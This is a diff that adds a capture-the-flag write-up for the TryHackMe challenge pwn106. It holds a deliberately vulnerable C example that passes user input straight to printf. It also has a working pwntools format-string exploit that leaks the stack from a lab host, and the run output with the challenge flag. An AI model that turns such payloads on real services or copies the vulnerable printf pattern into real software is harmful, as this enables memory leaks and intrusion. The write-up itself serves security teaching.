@@ -910,6 +910,116 @@ THM{VerY_b4D_1n73G3rsss}
 ---
 
 
+# Challenge 6 - pwn106
+
+Let's run the binary:
+
+Basic file check:
+---
+```bash
+❯ checksec --file=pwn106-user-1644300441063.pwn106-user
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   49 Symbols	 No	0		2		pwn106-user-1644300441063.pwn106-user
+```
+
+---
+
+```bash
+❯ ./pwn106-user-1644300441063.pwn106-user
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 107          
+
+🎉 THM Giveaway 🎉
+
+Enter your THM username to participate in the giveaway: lynk
+
+Thanks lynk
+```
+---
+
+
+Thers's a Format String vulnerability:
+
+Here's a example demonstrating a format string vulnerability in a C program:
+
+```c
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+    char buffer[100];
+    int secret = 42;
+
+    printf("Enter your name: ");
+    scanf("%s", buffer); // Vulnerable input
+
+    printf(buffer); // Vulnerable printf
+
+    printf("\nSecret value: %d\n", secret);
+
+    return 0;
+}
+```
+---
+
+In the above example, the program prompts the user to enter their name and then directly passes the input to printf() without proper validation. If an attacker enters a format string containing %x, %s, or %n, they can manipulate the behavior of printf().
+
+For instance, if the attacker enters %x %x %x %x, printf() will attempt to read values from the stack as if they were additional arguments. This can lead to the leaking of sensitive information, such as the value of secret or other stack contents.
+
+---
+
+So now lets' write down our exploit:
+
+---
+
+```python3
+from pwn import *
+
+context.binary = binary = "./pwn106-user-1644300441063.pwn106-user"
+
+payload = "%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"
+
+# p = process()
+p = remote("10.10.93.97", 9006)
+p.recv()
+p.recv()
+p.sendline(payload)
+
+output = p.recv().strip().split(b" ")[1].split(b".")
+
+flag = ""
+
+for word in output:
+	flag += bytes.fromhex(word.decode("utf-8"))[::-1].decode("utf-8")
+print("The Flag is: {}".format(flag))
+```
+
+---
+
+Running the exploit:
+
+```bash
+❯ python3 exploit2.py
+[*] '/home/lynk/thm/pwn101/pwn106/pwn106-user-1644300441063.pwn106-user'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 10.10.93.97 on port 9006: Done
+/home/lynk/thm/pwn101/pwn106/exploit2.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(payload)
+The Flag is: THM{y0U_w0n_th3_Giv3AwaY_anD_th1s_1s_YouR_fl4G}
+[*] Closed connection to 10.10.93.97 port 9006
+```
+
+
+---
+
+
+---
+
 
 
 
